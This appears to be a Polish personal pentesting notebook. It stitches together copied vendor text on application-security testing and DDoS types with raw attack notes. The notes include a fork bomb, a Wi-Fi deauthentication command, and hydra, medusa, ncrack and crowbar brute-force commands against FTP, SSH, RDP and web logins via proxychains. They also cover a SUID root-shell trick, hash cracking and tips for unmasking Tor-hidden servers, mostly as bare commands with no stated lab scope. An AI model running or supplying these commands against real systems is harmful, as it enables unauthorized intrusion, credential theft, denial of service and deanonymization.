Dowiedz się więcej ze szczegółowego przewodnika po:

Testy bezpieczeństwa
Zarządzanie zależnościami
Cykl życia oprogramowania (SDLC)
Rodzaje testów bezpieczeństwa aplikacji
Istnieją trzy główne typy testów bezpieczeństwa aplikacji:

Testowanie bezpieczeństwa czarnej skrzynki
W teście czarnej skrzynki system testujący nie ma dostępu do wnętrza testowanego systemu. To jest perspektywa atakującego z zewnątrz. Narzędzie testujące lub człowiek testujący musi przeprowadzić rozpoznanie w celu zidentyfikowania testowanych systemów i wykrycia luk w zabezpieczeniach. Testowanie czarnoskrzynkowe jest bardzo cenne, ale niewystarczające, ponieważ nie może przetestować podstawowych słabości zabezpieczeń aplikacji.

Dowiedz się więcej ze szczegółowego przewodnika po testach czarnoskrzynkowych

Testowanie bezpieczeństwa białej skrzynki
W teście białej skrzynki system testujący ma pełny dostęp do wnętrza testowanej aplikacji. Klasycznym przykładem jest statyczna analiza kodu, w której narzędzie testujące ma bezpośredni dostęp do kodu źródłowego aplikacji. Testowanie białej skrzynki może zidentyfikować luki w logice biznesowej, problemy z jakością kodu, błędne konfiguracje zabezpieczeń i niebezpieczne praktyki kodowania. Testowanie białoskrzynkowe może również obejmować testowanie dynamiczne, które wykorzystuje techniki fuzzingu do sprawdzania różnych ścieżek w aplikacji i wykrywania nieoczekiwanych luk w zabezpieczeniach. Wadą podejścia białoskrzynkowego jest to, że nie wszystkie te luki będą w rzeczywistości możliwe do wykorzystania w środowiskach produkcyjnych.

Dowiedz się więcej ze szczegółowego przewodnika po testowaniu białej skrzynki

Testy bezpieczeństwa szarej skrzynki
W teście szarej skrzynki system testujący ma dostęp do ograniczonych informacji na temat elementów wewnętrznych testowanej aplikacji. Na przykład tester może otrzymać poświadczenia logowania, aby mógł przetestować aplikację z perspektywy zalogowanego użytkownika. Testowanie szarej skrzynki może pomóc w zrozumieniu, jaki poziom dostępu mają uprzywilejowani użytkownicy oraz jaki poziom szkód mogliby wyrządzić w przypadku włamania na konto. Testy szarej skrzynki mogą symulować zagrożenia wewnętrzne lub napastników, którzy już naruszyli granicę sieci. Testowanie szarej skrzynki jest uważane za wysoce wydajne, zachowując równowagę między podejściem czarnej i białej skrzynki.

Dowiedz się więcej ze szczegółowego przewodnika po testach szarej skrzynki

Narzędzia i rozwiązania bezpieczeństwa aplikacji
Zapora aplikacji internetowej (WAF)
WAF monitoruje i filtruje ruch HTTP, który przechodzi między aplikacją internetową a Internetem. Technologia WAF nie obejmuje wszystkich zagrożeń, ale może współpracować z pakietem narzędzi zabezpieczających w celu stworzenia całościowej ochrony przed różnymi wektorami ataków.

W modelu połączeń systemów otwartych (OSI), WAF służy jako ochrona warstwy protokołu siódmej, która pomaga chronić aplikacje internetowe przed atakami, takimi jak cross-site scripting (XSS), cross-site forgering, SQL injection i inkluzja plików .

W przeciwieństwie do serwera proxy, który chroni tożsamość komputerów klienckich przez pośrednika, WAF działa jak odwrotny serwer proxy, który chroni serwer przed ujawnieniem. WAF służy jako tarcza, która stoi przed aplikacją internetową i chroni ją przed Internetem — klienci przechodzą przez WAF, zanim dotrą do serwera.

Dowiedz się więcej o zaporze aplikacji internetowej Imperva

Samoochrona aplikacji w czasie wykonywania (RASP)
Technologia RASP może analizować zachowanie użytkownika i ruch aplikacji w czasie wykonywania. Jego celem jest pomoc w wykrywaniu i zapobieganiu cyberzagrożeniom poprzez uzyskanie wglądu w kod źródłowy aplikacji oraz analizę słabych punktów i słabych punktów.

Narzędzia RASP mogą identyfikować luki w zabezpieczeniach, które zostały już wykorzystane, przerywać te sesje i generować alerty w celu zapewnienia aktywnej ochrony.

Dowiedz się więcej o samoochronie aplikacji Imperva Runtime

Analiza składu oprogramowania (SCA)
Narzędzia SCA tworzą spis komponentów open source i komercyjnych innych firm używanych w oprogramowaniu. Pomaga dowiedzieć się, które składniki i wersje są aktywnie używane, oraz zidentyfikować poważne luki w zabezpieczeniach mające wpływ na te składniki.

Organizacje używają narzędzi SCA do znajdowania składników innych firm, które mogą zawierać luki w zabezpieczeniach.

Dowiedz się więcej o analizie składu oprogramowania (SCA)

Statyczne testowanie bezpieczeństwa aplikacji (SAST)
Narzędzia SAST pomagają testerom białych skrzynek w sprawdzaniu wewnętrznego działania aplikacji. Obejmuje sprawdzanie statycznego kodu źródłowego i raportowanie o zidentyfikowanych słabościach bezpieczeństwa.

SAST może pomóc znaleźć problemy, takie jak błędy składni, problemy z walidacją danych wejściowych, nieprawidłowe lub niezabezpieczone odwołania lub błędy matematyczne w nieskompilowanym kodzie. Możesz użyć analizatorów binarnych i kodu bajtowego, aby zastosować SAST do skompilowanego kodu.

Dowiedz się więcej o SAST

Dynamiczne testowanie bezpieczeństwa aplikacji (DAST)
Narzędzia DAST pomagają testerom czarnoskrzynkowym w wykonywaniu kodu i sprawdzaniu go w czasie wykonywania. Pomaga wykryć problemy, które mogą stanowić luki w zabezpieczeniach. Organizacje używają DAST do przeprowadzania skanowań na dużą skalę, które symulują wiele złośliwych lub nieoczekiwanych przypadków testowych. Testy te dostarczają raporty dotyczące odpowiedzi aplikacji.

DAST może pomóc zidentyfikować problemy, takie jak ciągi zapytań, użycie skryptów, żądań i odpowiedzi, wyciek pamięci, uwierzytelnianie, obsługa plików cookie i sesji, wykonywanie komponentów innych firm, wstrzykiwanie DOM i wstrzykiwanie danych.

Dowiedz się więcej o DAST

Interaktywne testowanie bezpieczeństwa aplikacji (IAST)
Narzędzia IAST wykorzystują techniki i narzędzia SAST i DAST do wykrywania szerszego zakresu problemów związanych z bezpieczeństwem. Narzędzia te działają dynamicznie, aby kontrolować oprogramowanie w czasie wykonywania. Inspekcja skompilowanego kodu źródłowego odbywa się z poziomu serwera aplikacji.

Narzędzia IAST mogą ułatwić naprawę, dostarczając informacji o pierwotnej przyczynie luk w zabezpieczeniach i identyfikując określone wiersze kodu, którego dotyczy problem. Narzędzia te mogą analizować przepływ danych, kod źródłowy, konfigurację i biblioteki innych firm. Możesz także użyć narzędzi IAST do testowania API.

Dowiedz się więcej o IAST

Testowanie bezpieczeństwa aplikacji mobilnych (MAST)
Narzędzia MAST wykorzystują różne techniki do testowania bezpieczeństwa aplikacji mobilnych. Polega na wykorzystaniu analizy statycznej i dynamicznej oraz badaniu danych kryminalistycznych gromadzonych przez aplikacje mobilne.

Organizacje używają narzędzi MAST do sprawdzania luk w zabezpieczeniach i problemów specyficznych dla urządzeń mobilnych, takich jak jailbreak, wyciek danych z urządzeń mobilnych i złośliwe sieci Wi-Fi.

CNAPP
Platforma ochrony aplikacji natywnych w chmurze (CNAPP) zapewnia scentralizowany panel sterowania dla narzędzi wymaganych do ochrony aplikacji natywnych w chmurze. Łączy platformę ochrony obciążeń w chmurze (CWPP) i zarządzanie stanem bezpieczeństwa w chmurze (CSPM) z innymi funkcjami.

Technologia CNAPP często obejmuje zarządzanie uprawnieniami tożsamości, wykrywanie i ochronę API oraz automatyzację i bezpieczeństwo orkiestracji dla platform orkiestracji kontenerów, takich jak Kubernetes.

Najlepsze praktyki dotyczące bezpieczeństwa aplikacji
Oto kilka najlepszych praktyk, które mogą pomóc w efektywniejszym ćwiczeniu bezpieczeństwa aplikacji.

Wykonaj ocenę zagrożenia
Posiadanie listy wrażliwych zasobów, które należy chronić, może pomóc w zrozumieniu zagrożeń, przed jakimi stoi Twoja organizacja, i sposobów ich łagodzenia. Zastanów się, jakich metod haker może użyć do złamania zabezpieczeń aplikacji, czy są stosowane istniejące środki bezpieczeństwa i czy potrzebujesz dodatkowych narzędzi lub środków ochronnych.

Ważne jest również, aby realistycznie podchodzić do swoich oczekiwań w zakresie bezpieczeństwa. Nawet przy najwyższym poziomie ochrony nie ma rzeczy niemożliwych do zhakowania. Musisz także szczerze powiedzieć, co Twój zespół może wytrzymać w dłuższej perspektywie. Jeśli będziesz naciskać zbyt mocno, standardy i praktyki bezpieczeństwa mogą zostać zignorowane. Pamiętaj, że bezpieczeństwo to przedsięwzięcie długoterminowe i potrzebujesz współpracy innych pracowników oraz swoich klientów.

Przesuń zabezpieczenia w lewo
Firmy przechodzą z rocznych wydań produktów na wydania miesięczne, tygodniowe lub dzienne. Aby dostosować się do tej zmiany, testowanie bezpieczeństwa musi być częścią cyklu rozwoju, a nie dodane po namyśle. W ten sposób testy bezpieczeństwa nie przeszkadzają w wydawaniu produktu.

Dobrym pierwszym krokiem przed wprowadzeniem tych zmian jest pomoc pracownikom ds. bezpieczeństwa w zrozumieniu procesów programistycznych i budowaniu relacji między zespołami ds. bezpieczeństwa i programistów. Pracownicy ds. bezpieczeństwa muszą nauczyć się narzędzi i procesów używanych przez programistów, aby mogli organicznie zintegrować zabezpieczenia. Gdy zabezpieczenia są płynnie zintegrowane z procesem rozwoju, programiści chętniej je stosują i budują zaufanie.

Musisz także znaleźć sposób na zautomatyzowanie testowania bezpieczeństwa dla potoków CI/CD. Integracja zautomatyzowanych narzędzi bezpieczeństwa z potokiem CI/CD pozwala programistom na szybkie naprawienie problemów w krótkim czasie po wprowadzeniu odpowiednich zmian.

Dowiedz się więcej ze szczegółowego przewodnika po testowaniu przesunięcia w lewo

Nadaj priorytet swoim operacjom naprawczym
Luki w zabezpieczeniach są coraz większe, a deweloperom trudno jest rozwiązać wszystkie problemy. Biorąc pod uwagę skalę zadania, priorytetyzacja ma kluczowe znaczenie dla zespołów, które chcą zapewnić bezpieczeństwo aplikacji.

Skuteczne ustalanie priorytetów wymaga przeprowadzenia oceny zagrożenia w oparciu o wagę podatności — przy użyciu ocen CVSS i innych kryteriów, takich jak znaczenie operacyjne aplikacji, której dotyczy luka. Jeśli chodzi o luki w zabezpieczeniach oprogramowania open source, musisz wiedzieć, czy zastrzeżony kod faktycznie wykorzystuje lukę w zabezpieczeniach komponentów open source. Jeśli funkcja podatnego komponentu nigdy nie jest wywoływana przez twój produkt, to jego ocena CVSS jest znacząca, ale nie ma wpływu ani ryzyka.

Mierz wyniki bezpieczeństwa aplikacji
Ważne jest, aby mierzyć i raportować powodzenie programu ochrony aplikacji. Zidentyfikuj wskaźniki, które są najważniejsze dla Twoich kluczowych decydentów i przedstaw je w łatwy do zrozumienia i praktyczny sposób, aby uzyskać poparcie dla Twojego programu.

Podawanie dyrektorom zbyt wielu wskaźników na wczesnym etapie może być przytłaczające i, szczerze mówiąc, niepotrzebne. Głównym celem jest wskazanie, w jaki sposób program bezpieczeństwa aplikacji jest zgodny z wewnętrznymi politykami oraz pokazanie wpływu w zakresie redukcji podatności i zagrożeń oraz zwiększenia odporności aplikacji.

Zarządzaj uprawnieniami
Ważne jest, aby ograniczyć uprawnienia, szczególnie w przypadku systemów o znaczeniu krytycznym i wrażliwych. Najlepsze rozwiązania dotyczące bezpieczeństwa aplikacji ograniczają dostęp do aplikacji i danych do tych, którzy ich potrzebują, kiedy ich potrzebują — jest to znane jako zasada najmniejszych uprawnień. Najmniejsze przywileje mają kluczowe znaczenie z dwóch powodów:

Hakerzy mogą naruszyć mniej uprzywilejowane konta i ważne jest, aby upewnić się, że nie mogą uzyskać dostępu do wrażliwych systemów.
Zagrożenia wewnętrzne są tak samo niebezpieczne, jak napastnicy zewnętrzni. Jeśli wtajemniczeni się zepsują, ważne jest, aby upewnić się, że nigdy nie będą mieli więcej przywilejów niż powinni – ograniczając szkody, jakie mogą wyrządzić.
Bezpieczeństwo aplikacji dzięki Imperva
Imperva zapewnia kompleksową ochronę aplikacji, interfejsów API i mikrousług:

Zapora aplikacji sieci Web — zapobiegaj atakom dzięki światowej klasy analizie ruchu internetowego kierowanego do aplikacji.

Runtime Application Self-Protection (RASP) — wykrywanie ataków w czasie rzeczywistym i zapobieganie im ze środowiska wykonawczego aplikacji jest dostępne wszędzie tam, gdzie znajdują się aplikacje. Powstrzymaj zewnętrzne ataki i zastrzyki oraz zmniejsz zaległości w zabezpieczeniach.

Bezpieczeństwo API — zautomatyzowana ochrona API zapewnia ochronę punktów końcowych API w miarę ich publikowania, chroniąc aplikacje przed wykorzystaniem.

Zaawansowana ochrona przed botami — zapobiegaj atakom logiki biznesowej ze wszystkich punktów dostępu — witryn internetowych, aplikacji mobilnych i interfejsów API. Uzyskaj bezproblemowy wgląd i kontrolę nad ruchem botów, aby powstrzymać oszustwa online poprzez przejęcie konta lub konkurencyjne ceny.

Ochrona przed atakami DDoS — Blokuj ruch ataków na brzegu sieci, aby zapewnić ciągłość biznesową z gwarantowanym czasem pracy bez wpływu na wydajność. Zabezpiecz swoje zasoby lokalne lub w chmurze — niezależnie od tego, czy są hostowane w AWS, Microsoft Azure czy Google Public Cloud.

Analiza ataków — zapewnia pełną widoczność dzięki uczeniu maszynowemu i wiedzy o domenie w całym stosie zabezpieczeń aplikacji, aby ujawniać wzorce w hałasie i wykrywać ataki na aplikacje, umożliwiając izolowanie i zapobieganie kampaniom ataków.

Ochrona po stronie klienta — uzyskaj wgląd i kontrolę nad kodem JavaScript innych firm, aby zmniejszyć ryzyko oszustw w łańcuchu dostaw, zapobiegać naruszeniom danych i atakom po stronie klienta.

------------------------------------------------------------------------------------------------------
Najczęstsze ataki dos/ddos

Ataki oparte na woluminach
Obejmuje powodzi UDP, powodzi ICMP i innych powodzi sfałszowanych pakietów. Celem ataku jest nasycenie przepustowości zaatakowanej strony, a wielkość jest mierzona w bitach na sekundę (Bps).

Ataki na protokoły 
Obejmuje powodzie SYN, ataki pofragmentowanych pakietów, Ping of Death, Smurf DDoS i inne. Ten typ ataku zużywa rzeczywiste zasoby serwera lub pośredniego sprzętu komunikacyjnego, takiego jak zapory ogniowe i systemy równoważenia obciążenia , i jest mierzony w pakietach na sekundę (Pps).

Ataki w warstwie aplikacji 
Obejmuje ataki typu low-and-slow, powodzie GET/POST, ataki skierowane na podatności Apache, Windows lub OpenBSD i inne. Celem tych ataków, składających się z pozornie uzasadnionych i niewinnych żądań, jest awaria serwera WWW, a ich wielkość jest mierzona w żądaniach na sekundę (Rps).
------------------------------------------------------------------------------------------------------

**OTWARTE PORTY DO WYKORZYSTYWANIA:**
- 21/tcp otwarte ftp vsftpd 2.3.4
- 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protokół 2.0)
- 23/tcp otwarty telnet Linux telnetd
- 25/tcp otwórz smtp Postfix smtpd
- 53/tcp otwarta domena ISC BIND 9.4.2
- 80/tcp otwarty http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
- Filtrowany pop 110/tcp3
- 111/tcp otwarty rpcbind 2 (RPC #100000)
- 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (grupa robocza: WORKGROUP)
- 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (grupa robocza: WORKGROUP)
- 512/tcp open exec netkit-rsh rexecd
- 513/tcp otwarte logowanie OpenBSD lub Solaris rlogind
- 514/tcp otwarta powłoka Netkit rshd
- 1099/tcp otwórz rmiregistry GNU Classpath grmiregistry
- 1524/tcp otwarta powłoka Metasploitable powłoka główna
- 2049/tcp otwarte nfs 2-4 (RPC #100003)
- 2121/tcp otwarty ftp ProFTPD 1.3.1
- 3306/tcp otwórz mysql MySQL 5.0.51a-3ubuntu5
- 5432/tcp otwarte postgresql PostgreSQL DB 8.3.0 - 8.3.7
- 5900/tcp otwarte vnc VNC (protokół 3.3)
- 6000/tcp otwarte X11 (odmowa dostępu)
- 6667/tcp otwarty IRC UnrealIRCd
- 8009/tcp otwarty ajp13 Apache Jserv (Protokół v1.3)
- 8180/tcp otwarty silnik http Apache Tomcat/Coyote JSP 1.1

https://www.exploit-db.com/google-hacking-database


* SMTP ( Simple Mail Transfer Protocol) - Służy do obsługi wysyłania wiadomości e-mail. 
* POP3 (Post Office Protocol) — odpowiada za przesyłanie poczty e-mail między klientem a serwerem pocztowym. 
IMAP (Internet Message Access Protocol) —  odpowiada za przesyłanie wiadomości e-mail między klientem a serwerem pocztowym. 
![805172273b08debff6a0c2af033c63fa.png](:/e543746967c4426b9e04450b7a88a105)

Zmienając rekordy DNS tak, aby zawierały listę Sender Policy Frramework (SPF) mozna określić który serwery mogą wysyłać wiadomości e-mail z mojej domeny.

Wdrażając DKIM można udowodnić ze wiadomość e-mail został wysłany z Mojej domeny. 

Fork bomba jest formą ataku typu „odmowa usługi” (DoS) na system oparty na Linuksie lub Uniksie . Wykorzystuje działanie. :(){ :|:& };: zwana również wirusem królika lub wabbit) to atak typu „odmowa usługi”, w którym proces nieustannie się replikuje, aby wyczerpać dostępne zasoby systemowe, spowalniając lub powodując awarię systemu z powodu braku zasobów .

atak deauthentication - pozwala nam odłączyć dowolne urządzenie od dowolnej sieci, która znajduje się w naszym zasięgu, nawet jeśli sieć ma szyfrowanie lub używa klucza. będziemy udawać klienta i wysłać pakiet deauthentication do routera, zmieniając nasz adres MAC na adres MAC klienta i informując router, że chcemy się od ciebie odłączyć. W tym samym czasie będziemy udawać router, zmieniając nasz adres MAC na adres MAC routera, aż do momentu odłączenia klienta, którego żądamy. Następnie połączenie zostanie utracone

![deauthenticate-the-wireless-client.png](:/256ceb7ed9734324b38cbcaadbc521d8)

POLECENIE - aireplay-ng --deauth 100000 -a [NetworkMac] -c [TargetMac] [wlan0/eth0]

port 21 , który jest portem FTP. FTP to rodzaj usługi, która jest instalowana, aby umożliwić użytkownikom przesyłanie i pobieranie plików ze zdalnego serwera. Usługa FTP zwykle używa nazwy użytkownika i hasła, ale widzimy, że ta usługa została źle skonfigurowana i umożliwia anonimowe logowanie przez FTP. W ten sposób będziemy mogli zalogować się bez hasła
![server-side-attack-basics2.png](:/bef96ccf939e41b79f955760bcef3a4c)
Wszystko, co musimy zrobić, to pobrać klienta FTP, takiego jak FileZilla . Teraz będziemy mogli łączyć się za pomocą tego adresu IP na porcie 21. Możemy również wygooglować serwer FTP, który w naszym przypadku to vsftpd 2.3.4 , i sprawdzić, czy ma jakieś problemy, czy ma jakieś błędy w konfiguracji lub czy zawiera wszelkie znane luki w wykonywaniu kodu. Kiedy już to wygooglujemy, zobaczymy, że vsftpd 2.3.4

port 512 - Komputer docelowy działa na Ubuntu i widzimy, że tutaj używa usługi rsh-client do połączenia. Dlatego musimy zainstalować pakiet rsh-client , aby połączyć się z tą usługą.
rlogin -l root IP

NARZĘDZIE PATATOR KOMENDA - proxychains patator ssh_login host=example.com user=root password=/home/kali/Desktop/mentalist/tests/first  0=/home/kali/Desktop/mentalist/tests/first -x ignore:mesg='Authentication failed.'

proxychains dmitry example.com -w -n -s -e -o output.out

sudo proxychains xprobe2 example.com

technika ataku typu adversary-in-the-middle (AitM) zdolną do ominięcia uwierzytelniania wieloskładnikowego

CAPEC-117: Przechwytywanie - Przeciwnik monitoruje strumienie danych do lub od celu w celu zbierania informacji. Atak ten można przeprowadzić wyłącznie w celu zebrania poufnych informacji lub w celu wsparcia dalszego ataku na cel. Ten wzorzec ataku może obejmować sniffowanie ruchu sieciowego, a także innych rodzajów strumieni danych (np. radiowych). Przeciwnik może próbować zainicjować ustanowienie strumienia danych lub pasywnie obserwować komunikację w miarę jej rozwoju. We wszystkich wariantach tego ataku przeciwnik nie jest zamierzonym odbiorcą strumienia danych. W przeciwieństwie do innych sposobów zbierania informacji (np. kierowanie wycieków danych), przeciwnik musi aktywnie pozycjonować się tak, aby obserwować wyraźne kanały danych (np. ruch sieciowy) i czytać zawartość. Jednak ten atak różni się od Adversary-In-the-Middle ( https://capec.mitre.org/data/definitions/94.html), ponieważ przeciwnik nie zmienia treści komunikatów ani nie przekazuje danych do zamierzonego odbiorcy.

Uzyskaj adres mac jednego z komputerów w klasie komputerów, aby przeprowadzić atak mac spoofing

Jak działają ataki łańcucha dostaw? Aby atak w łańcuchu dostaw zadziałał, hakerzy muszą wstawić złośliwy kod do oprogramowania lub znaleźć sposoby na złamanie zabezpieczeń protokołów lub komponentów sieciowych . Gdy odkryją możliwość włamania, wykorzystują ją, uzyskując dostęp do krytycznych zasobów cyfrowych

ftp anonymous login:
**sudo proxychains nmap -p 21 IP --script ftp-anon**
bruteforce: **proxychains  ncrack -U Username.txt -P Password.txt ftp://10.10.10.10**
Logowanie: **proxychains ftp IP
defultowe hasło i nazwa użytkownika: **anonymous**

BRUTEFORCE rdp:
SKANOWANIE: sudo proxychains nmap 10.10.10.0/24 -p 3389
 nmap -sV 10.10.10.10
SPRAWdZANIE: msfconsole
           use auxiliary/scanner/rdp/rdp_scanner
          set RHOSTS 10.10.10.10
          exploit
ATAK: ./crowbar.py --server 10.10.10.10/32 -b rdp -u /usr/share/usernames -C /usr/share/passwords
lub mogę użyć ncracka.
POŁĄCZENIE: xfreerdp /u:USERNAME /p:PASSWORd /v:10.10.10.10

znajdywanie podatnych: shodan search remote desktop
https://youtu.be/xEt5VSsLRho?list=LL
.
port 8081 Konsola użytkownika blackice-icecap" to oprogramowanie administracyjne dla systemu firewall.

Wireless Application Protocol (WAP) to specyfikacja zestawu protokołów komunikacyjnych w celu standaryzacji sposobu, w jaki urządzenia bezprzewodowe, takie jak telefony komórkowe i urządzenia nadawczo-odbiorcze, mogą być używane do dostępu do Internetu, w tym poczty e-mail, sieci WWW, grup dyskusyjnych i wiadomości błyskawicznych.

./enum4linux.pl -a IP

https://www.digitalocean.com/community/tutorials/5-common-server-setups-for-your-web-application

BRUTEFORCE SSH: proxychains medusa -h 10.10.10.10 -U Username.txt -P Password.txt -M ssh -n 22

FTP hacking: medusa -H hosts.txt -U users.txt -P pass.txt -M ftp -v 6

oraz
medusa -h 10.10.1.141 -U users.txt -P pass.txt -M ftp -w 07

BRUTEFORCE ONLINE:
 musisz określić typ ataku internetowego, niezależnie od tego, czy jest to „http-post-form”, „http-get-form”, czy też wykorzystuje uwierzytelnianie podstawowe. Następnie musisz określić ścieżkę do pliku do ataku. Następnie musisz określić parametry ataku (nazwę użytkownika i hasło). Ponadto musisz określić symbole zastępcze dla użytkownika i przekazać zmienne. Na koniec musisz określić wszelkie pliki cookie. Przykład tego możesz zobaczyć poniżej:

hydra -L users.txt -P password.txt 10.0.2.5  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V

**różne ataki o których mogłem nie słyszeć/zapomnieć:**
1. Ataki desynchronizujące

2. Techniki unikania WAF (wyróżniona  malformed chunk Pawła Hałdrzyńskiego)

3. Atakowanie interfejsów internetowych MS Exchange

4.ImageMagick - Wstrzyknięcie powłoki za pomocą hasła PDF

5.Nieuwierzytelniony RCE w MobileIron MDM

6.Przemycanie nagłówków HTTP przez odwrotne serwery proxy

7. Transmisja strumieniowa NAT

8.Kiedy TLS Cię zhakuje (SSRF często ma krytyczny wpływ, ale jeśli nie ma wygodnych usług internetowych, do których można by go skierować, może wydawać się frustrująco nieszkodliwy. When TLS Hacks You to technika inspirowana wstrzykiwaniem SNI autorstwa Joshua Maddux , która w elegancki sposób łączy ponowne wiązanie DNS i wznawianie sesji TLS w celu wykorzystania wewnętrznych usług, które nie obsługują protokołu HTTP. Jak to ujął deskryptor pliku, przywrócił gopher://!)

9. Atakowanie kontekstów drugorzędnych w aplikacjach internetowych

10. Przenośna filtracja danych: XSS dla plików PDF

11.Przemyt H2C: żądanie przemytu za pośrednictwem zwykłego tekstu HTTP/2

https://portswigger.net/research/top-10-web-hacking-techniques-of-2020-nominations-open

eskalacja uprawnień - plik binarny służący do zmiany hasła ma ustawiony bit SUID (/usr/bin/passwd) komenda - find / -user root -perm -4000 -exec ls -ldb {} \;
systemctl , to proces istniejący w systemach operacyjnych Linux, który służy do uruchamiania różnych usług, takich jak serwery Apache. Ze względu na poziom wpływu, jaki systemctl może mieć na system, jest on generalnie zarezerwowany dla uprzywilejowanych użytkowników, takich jak administratorzy systemu. Istnieją przypadki, w których uprawnienia do systemctl mogą być błędnie skonfigurowane, co pozwala na wykorzystanie ich do eskalacji uprawnień.

Zmieniając „id > /tmp/output” na „sh -p” lub „chmod +s /bin/bash”, a następnie uruchomić „bash -p” , mogę otrzymać powłokę root. Po śladach i błędach polecenie, które działało najlepiej, to „chmod + s /bin/bash”, a następnie „bash –p”

amanie hasha :

PRZYGOTOWYWANIE: echo 'hash' | > hash.txt
ŁAMANIE: john hash.txt --wordlist=rockyou.txt          #rockyou.txt to nazwa listy haseł.

 27 ways to learn ethical hacking for free:

1. Root Me — Challenges.
2. Stök's YouTube — Videos.
3. Hacker101 Videos — Videos.
4. InsiderPhD YouTube — Videos.
5. EchoCTF — Interactive Learning.
6. Vuln Machines — Videos and Labs.
7. Try2Hack — Interactive Learning.
8. Pentester Land — Written Content.
9. Checkmarx — Interactive Learning.
10. Cybrary — Written Content and Labs.
11. RangeForce — Interactive Exercises.
12. Vuln Hub — Written Content and Labs.
13. TCM Security — Interactive Learning.
14. HackXpert — Written Content and Labs.
15. Try Hack Me — Written Content and Labs.
16. OverTheWire — Written Content and Labs.
17. Hack The Box — Written Content and Labs.
18. CyberSecLabs — Written Content and Labs.
19. Pentester Academy — Written Content and Labs.
20. Bug Bounty Reports Explained YouTube — Videos.
21. Web Security Academy — Written Content & Labs.
22. Securibee's Infosec Resources — Written Content.
23. Jhaddix Bug Bounty Repo — Written Content.
24. Zseano's Bug Bounty Methodology — Free Ebook.
25. Awesome AppSec GitHub — Written Content.
26. NahamSec's Bug Bounty Repo — Written Content.
27. Kontra Application Security — General Learning.

	SSRF - https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/

BLOODHOUND - sudo neo4j console
firefox: localhost:7474
start bloodhound

## PrintNightmare: 
była krytyczną luką w zabezpieczeniach systemu operacyjnego Microsoft Windows . Luka wystąpiła w usłudze bufora wydruku . Były dwa warianty, jeden umożliwiający zdalne wykonanie kodu (CVE-2021-34527), a drugi prowadzący do eskalacji uprawnień (CVE-2021-1675). Trzecia luka w zabezpieczeniach (CVE-2021-34481) została ogłoszona 15 lipca 2021 r. i zaktualizowana do zdalnego wykonywania kodu przez firmę Microsoft w sierpniu.




PrivateEscalation: 
Zwykle zalecałbym uruchomienie LinEnum.sh lub LinPEAS, ale w tym przypadku TryHackMe wskazuje nam właściwy kierunek; będziemy nadużywać nieprawidłowego pliku binarnego SUID.

Następującego polecenia można użyć do znalezienia wszystkich plików binarnych w systemie, które mają ustawiony bit SUID:

znajdź / -perm -u=s -type f 2>/dev/null

**Pro-tip, uruchom to polecenie również na swoim komputerze Kali; pod warunkiem, że nie dodałeś żadnych plików binarnych SUID na własnej maszynie, jest to przydatne do sprawdzania krzyżowego w celu znalezienia niespójnych plików binarnych.




https://gtfobins.github.io/  <-->
Ta witryna zawiera listę kilku popularnych plików binarnych systemu Linux i sposobów ich wykorzystania w celu ominięcia lokalnych ograniczeń bezpieczeństwa.


https://github.com/samanL33T/Awesome-Mainframe-Hacking
„System komputerowy typu mainframe” odnosi się do dużego, wydajnego i scentralizowanego systemu komputerowego przeznaczonego do przetwarzania ogromnych ilości danych i obsługi wielu użytkowników jednocześnie. Systemy mainframe są często używane przez duże organizacje i agencje rządowe do wykonywania krytycznych funkcji, takich jak transakcje finansowe, zarządzanie opieką zdrowotną i badania naukowe.

hydra.exe -q -v -V -t 30 -L _logins.txt -P _passwords.txt -M _servers.txt -o ./__results.txt http-post-form "/ui/#/login:<koperta xmlns ='http\://schemas.xmlsoap.org/soap/envelope/' xmlns\:xsi='http\://www.w3.org/2001/XMLSchema-instance'><Body><Login xmlns=' urn\:vim25'><_this type='SessionManager'>ha-sessionmgr</_this><userName>^USER^</userName><password>^PASS^</password><locale>en-US</locale </Login></Body></Envelope>:S=Cannot"

Ta komenda wykorzystuje narzędzie Hydra do przeprowadzenia ataku typu "brute force" na stronie internetowej. Poniżej opis poszczególnych parametrów:

hydra.exe - plik wykonywalny narzędzia Hydra
-q -v -V - parametry wypisujące komunikaty o błędach, postępach i wynikach działania programu
-t 30 - liczba wątków używanych do ataku, w tym przypadku 30
-L _logins.txt - plik zawierający listę loginów, które będą używane podczas ataku. Loginy są zapisane w pliku _logins.txt.
-P _passwords.txt - plik zawierający listę haseł, które będą używane podczas ataku. Hasła są zapisane w pliku _passwords.txt.
-M _servers.txt - plik zawierający listę adresów serwerów, które będą atakowane. Adresy serwerów są zapisane w pliku _servers.txt.
-o ./__results.txt - plik wynikowy, w którym zostaną zapisane wyniki ataku. Wyniki zostaną zapisane w pliku __results.txt.
http-post-form - metoda HTTP, która zostanie użyta podczas ataku.
"/ui/#/login:<koperta xmlns ='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><Body><Login xmlns=' urn\:vim25'><_this type='SessionManager'>ha-sessionmgr</_this><userName>^USER^</userName><password>^PASS^</password><locale>en-US</locale </Login></Body></Envelope>:S=Cannot" - przy użyciu metody HTTP POST, atakujący próbuje zalogować się na stronie /ui/#/login, używając listy loginów i haseł z plików _logins.txt i _passwords.txt. Znaczniki ^USER^ i ^PASS^ zostaną zastąpione odpowiednio loginem i hasłem z listy.



 uzyskanie w pełni kwalifikowanej nazwy domeny: `crackmapexec smb <IP>`
(Można podać zakres adresów IP) Lub `nmap <IP> -p 445,137,138 --script smb-os-discovery`



## **Find Servers behind tor:**
- server status webrequest (unset hta), front end caching (misconfigured varnish), Carnegie Melon method, Global viewership and other techniques detailed by Neal (guy from fotoforensics), SSL Cert sometimes, messing up modprox, so on

- The onion service only needs to bind to the localhost. If it is configured for an interface IP it might be found because of unique attributes like HTTP headers.

- https://riseup.net/ca/security/network-security/tor/onionservices-best-practices#be-careful-of-localhost-bypasses

Blockchain to rozproszona baza danych lub rejestr, który jest współdzielony między węzłami sieci komputerowej. Jako baza danych, blockchain przechowuje informacje elektronicznie w formacie cyfrowym. Ethereum to protokół blockchain, taki jak bitcoin. W przeciwieństwie do Bitcoin, Ethereum jest Turing-complete, co oznacza, że ​​może z grubsza naśladować aspekty obliczeniowe dowolnego innego komputera ogólnego przeznaczenia i uruchamiać programy w świecie rzeczywistym.

